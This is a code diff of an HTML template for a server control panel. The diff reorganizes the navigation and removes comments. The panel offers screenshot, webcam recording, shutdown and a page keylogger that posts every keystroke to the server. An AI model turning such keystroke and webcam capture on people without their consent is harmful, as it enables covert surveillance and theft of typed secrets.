@@ -6,16 +6,19 @@
 </head>
 <body>
 
-    <div class="sidebar">
-        <h2>Control Panel</h2>
+    <!-- TOP NAVBAR -->
+    <div class="topbar">
+        <h2>Server Control Panel</h2>
 
-        <a href="/start">Start App</a>
-        <a href="/stop">Stop App</a>
-        <a href="/screenshot">Screenshot</a>
-        <a href="/keylogger">Web Keylogger</a>
-        <a href="/webcam">Webcam</a>
-        <a href="/shutdown">Shutdown</a>
-        <a href="/restart">Restart</a>
+        <div class="menu">
+            <a href="/start">Start App</a>
+            <a href="/stop">Stop App</a>
+            <a href="/screenshot">Screenshot</a>
+            <a href="/keylogger">Web Keylogger</a>
+            <a href="/webcam">Webcam</a>
+            <a href="/shutdown">Shutdown</a>
+            <a href="/restart">Restart</a>
+        </div>
     </div>
 
     <div class="main">
@@ -54,17 +57,14 @@
         </form>
         {% endif %}
 
+        <!-- KEYLOGGER -->
         {% if mode == "keylogger" %}
         <h2>Web Keylogger</h2>
         <p>Hệ thống đang ghi lại tất cả phím bạn nhấn trên trang web này.</p>
 
-        <!-- Thêm id để JS cập nhật -->
-        <pre id="keylog" style="background:#f0f0f0; padding:10px; border-radius:5px; max-height:400px; overflow:auto; color:#ff0000;">
-        [Loading keys...]
-        </pre>
+        <pre id="keylog" class="keybox">[Loading keys...]</pre>
 
         <script>
-        // Gửi key xuống server khi nhấn phím
         document.addEventListener("keydown", function(e) {
             fetch("/logkey_web", {
                 method: "POST",
@@ -73,26 +73,22 @@
             });
         });
 
-        // Hàm fetch dữ liệu keylogger mỗi giây
         function updateKeylog() {
             fetch("/keylogger_data")
                 .then(res => res.json())
                 .then(data => {
                     const pre = document.getElementById("keylog");
                     pre.textContent = data.keys;
-
-                    // Tự cuộn xuống cuối
                     pre.scrollTop = pre.scrollHeight;
                 });
         }
 
-        // Cập nhật liên tục mỗi 30 mili giây
         setInterval(updateKeylog, 30);
         updateKeylog();
         </script>
         {% endif %}
 
-        <!-- WEBCAM RECORD -->
+        <!-- WEBCAM -->
         {% if mode == "webcam" %}
         <h2>Record Webcam</h2>
 
@@ -113,7 +109,6 @@
         </form>
         {% endif %}
 
-        <!-- SHUTDOWN -->
         {% if mode == "shutdown" %}
         <form action="/control" method="POST">
             <input type="hidden" name="action" value="shutdown">
@@ -121,7 +116,6 @@
         </form>
         {% endif %}
 
-        <!-- RESTART -->
         {% if mode == "restart" %}
         <form action="/control" method="POST">
             <input type="hidden" name="action" value="restart">
